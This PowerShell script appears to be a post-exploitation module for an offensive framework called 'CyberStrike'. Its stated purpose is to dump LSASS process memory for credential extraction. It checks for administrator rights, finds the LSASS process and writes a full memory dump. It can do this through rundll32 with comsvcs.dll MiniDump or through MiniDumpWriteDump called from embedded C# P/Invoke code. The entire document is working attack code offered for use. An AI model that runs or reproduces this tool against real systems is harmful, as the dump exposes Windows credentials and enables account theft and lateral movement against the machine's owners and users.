<#
.SYNOPSIS
    Dump LSASS process memory for credential extraction.
.DESCRIPTION
    CyberStrike post-exploitation module: dumps LSASS via comsvcs.dll or MiniDumpWriteDump.
    Requires administrative privileges.
.PARAMETER method
    Dump method: comsvcs (default) or minidump.
.PARAMETER outfile
    Output file path. Default: auto-generated in $env:TEMP.
.PARAMETER json-output
    Emit structured JSON lines to stdout.
.PARAMETER help
    Show usage and exit.
#>

param(
    [string]$method = "comsvcs",
    [string]$outfile = "",
    [switch]${json-output},
    [switch]$help
)

# ---------------------------------------------------------------------------
# Parse -- prefixed args from $args overflow (CyberStrike passes ["--json-output", ...])
# ---------------------------------------------------------------------------
$i = 0
while ($i -lt $args.Count) {
    switch ($args[$i]) {
        "--method"      { $method = $args[$i + 1]; $i += 2 }
        "--outfile"     { $outfile = $args[$i + 1]; $i += 2 }
        "--json-output" { ${json-output} = $true; $i++ }
        "--help"        { $help = $true; $i++ }
        default         { $i++ }
    }
}

$JsonOutput = ${json-output}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
function Write-JsonLine {
    param([hashtable]$Data)
    $Data["timestamp"] = (Get-Date -Format "o")
    $Data | ConvertTo-Json -Compress | Write-Output
}

function Write-Msg {
    param([string]$Level, [string]$Message, [hashtable]$Extra = @{})
    if ($JsonOutput) {
        $obj = @{ level = $Level; message = $Message } + $Extra
        Write-JsonLine $obj
    } else {
        $prefix = switch ($Level) { "error" { "[-]" } "success" { "[+]" } default { "[*]" } }
        Write-Host "$prefix $Message"
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
if ($help) {
    $usage = @"
lsass_dump.ps1 - Dump LSASS process memory

USAGE:
    .\lsass_dump.ps1 [--method comsvcs|minidump] [--outfile PATH] [--json-output] [--help]

OPTIONS:
    --method      Dump method: comsvcs (default) or minidump
    --outfile     Output file path (default: auto in `$env:TEMP)
    --json-output Emit JSON line output
    --help        Show this message

EXAMPLES:
    .\lsass_dump.ps1
    .\lsass_dump.ps1 --method minidump --outfile C:\temp\lsass.dmp --json-output
"@
    Write-Host $usage
    exit 0
}

# ---------------------------------------------------------------------------
# Admin check
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    Write-Msg -Level "error" -Message "This script requires administrative privileges. Run as Administrator."
    exit 1
}

# ---------------------------------------------------------------------------
# Validate method
# ---------------------------------------------------------------------------
if ($method -notin @("comsvcs", "minidump")) {
    Write-Msg -Level "error" -Message "Invalid method '$method'. Use 'comsvcs' or 'minidump'."
    exit 1
}

# ---------------------------------------------------------------------------
# Locate LSASS
# ---------------------------------------------------------------------------
$lsassProc = $null
try {
    $lsassProc = Get-Process lsass -ErrorAction Stop
} catch {
    Write-Msg -Level "error" -Message "Failed to find LSASS process: $_"
    exit 1
}
$lsassPid = $lsassProc.Id
Write-Msg -Level "info" -Message "LSASS PID: $lsassPid"

# ---------------------------------------------------------------------------
# Output file
# ---------------------------------------------------------------------------
if ([string]::IsNullOrEmpty($outfile)) {
    $ts = Get-Date -Format "yyyyMMdd_HHmmss"
    $outfile = Join-Path $env:TEMP "lsass_${ts}.dmp"
}
$outDir = Split-Path $outfile -Parent
if (-not (Test-Path $outDir)) {
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
}

# ---------------------------------------------------------------------------
# Cleanup handler
# ---------------------------------------------------------------------------
$cleanupDone = $false
function Invoke-Cleanup {
    if ($script:cleanupDone) { return }
    $script:cleanupDone = $true
    Write-Msg -Level "info" -Message "Cleanup: no temporary resources to release."
}
Register-EngineEvent PowerShell.Exiting -Action { Invoke-Cleanup } | Out-Null

# ---------------------------------------------------------------------------
# Dump: comsvcs method
# ---------------------------------------------------------------------------
function Invoke-ComsvcsDump {
    param([int]$Pid, [string]$Path)
    try {
        $cmd = "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $Pid $Path full"
        Write-Msg -Level "info" -Message "Executing: $cmd"
        $proc = Start-Process -FilePath "rundll32.exe" `
            -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $Pid $Path full" `
            -NoNewWindow -Wait -PassThru -ErrorAction Stop
        if ($proc.ExitCode -ne 0) {
            throw "rundll32 exited with code $($proc.ExitCode)"
        }
        if (-not (Test-Path $Path)) {
            throw "Dump file was not created at $Path"
        }
        return $true
    } catch {
        Write-Msg -Level "error" -Message "comsvcs dump failed: $_"
        return $false
    }
}

# ---------------------------------------------------------------------------
# Dump: minidump method (MiniDumpWriteDump via P/Invoke)
# ---------------------------------------------------------------------------
function Invoke-MinidumpDump {
    param([int]$Pid, [string]$Path)
    try {
        $csharp = @"
using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;

public class MiniDumpHelper {
    [Flags]
    public enum MinidumpType : uint {
        MiniDumpWithFullMemory = 0x00000002
    }

    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint ProcessId,
        IntPtr hFile,
        MinidumpType DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public static bool Dump(uint pid, string path) {
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hProc == IntPtr.Zero)
            throw new Exception("OpenProcess failed. Error: " + Marshal.GetLastWin32Error());

        try {
            using (var fs = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None)) {
                bool ok = MiniDumpWriteDump(
                    hProc, pid, fs.SafeFileHandle.DangerousGetHandle(),
                    MinidumpType.MiniDumpWithFullMemory,
                    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero
                );
                if (!ok)
                    throw new Exception("MiniDumpWriteDump failed. Error: " + Marshal.GetLastWin32Error());
                return true;
            }
        } finally {
            CloseHandle(hProc);
        }
    }
}
"@
        Add-Type -TypeDefinition $csharp -Language CSharp -ErrorAction Stop
        Write-Msg -Level "info" -Message "Invoking MiniDumpWriteDump via P/Invoke..."
        [MiniDumpHelper]::Dump([uint32]$Pid, $Path)
        if (-not (Test-Path $Path)) {
            throw "Dump file was not created at $Path"
        }
        return $true
    } catch {
        Write-Msg -Level "error" -Message "minidump method failed: $_"
        return $false
    }
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
try {
    Write-Msg -Level "info" -Message "Starting LSASS dump (method=$method, outfile=$outfile)"

    $success = $false
    switch ($method) {
        "comsvcs"  { $success = Invoke-ComsvcsDump -Pid $lsassPid -Path $outfile }
        "minidump" { $success = Invoke-MinidumpDump -Pid $lsassPid -Path $outfile }
    }

    if ($success -and (Test-Path $outfile)) {
        $fileInfo = Get-Item $outfile
        $result = @{
            status    = "success"
            method    = $method
            lsass_pid = $lsassPid
            dump_file = $outfile
            size_bytes = $fileInfo.Length
            size_mb   = [math]::Round($fileInfo.Length / 1MB, 2)
        }
        Write-Msg -Level "success" -Message "LSASS dump written to $outfile ($($result.size_mb) MB)" -Extra $result
    } else {
        $result = @{
            status    = "failure"
            method    = $method
            lsass_pid = $lsassPid
            dump_file = $outfile
        }
        Write-Msg -Level "error" -Message "LSASS dump failed." -Extra $result
        exit 1
    }
} catch {
    Write-Msg -Level "error" -Message "Unhandled error: $_"
    exit 1
} finally {
    Invoke-Cleanup
}
